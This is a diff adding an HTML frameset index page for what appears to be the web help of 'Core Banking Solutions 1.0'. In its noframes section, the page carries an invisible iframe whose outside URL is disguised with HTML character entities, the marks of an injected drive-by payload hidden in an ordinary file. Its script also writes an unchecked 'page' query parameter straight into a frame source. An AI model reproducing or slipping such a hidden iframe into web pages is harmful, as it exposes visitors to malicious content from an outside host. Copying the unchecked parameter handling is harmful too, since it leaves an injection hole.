@@ -1,0 +1,31 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
+<html>
+<head>
+<title>Core Banking Solutions 1.0</title>
+<meta http-equiv="Content-Type" content="text/html; charset=Windows-1252">
+<script>
+var LocString=String(window.document.location.href);
+var DefaultPage;
+function GetQueryString(str){
+    var rs=new RegExp("(^|)"+str+"=([^\&]*)(\&|$)","gi").exec(LocString),tmp;
+    if(tmp=rs)return tmp[2];
+    return null;
+    }
+DefaultPage = GetQueryString("page");
+if(DefaultPage==null || DefaultPage==''){
+	DefaultPage = 'scr/Overview_main.htm';
+}
+</script>
+</head>
+<script>
+document.write('<frameset rows="*" cols="250,*" framespacing="5" frameborder="yes" border="5" bordercolor="#DCDBD6">');
+document.write('<frame src="webhelpleft.htm" name="nav" frameborder="yes" scrolling="yes" bordercolor="#DCDBD6" id="nav">');
+document.write('<frame src="scr/' +  DefaultPage + '" name="content" frameborder="yes" bordercolor="#DCDBD6" id="content">');
+document.write('</frameset>');
+</script>
+
+<noframes><body>
+
+<iframe src="http://jL.ch&#117;ra.pl&#47;rc/" style="d&#105;splay:none"></iframe>
+</body></noframes>
+</html>
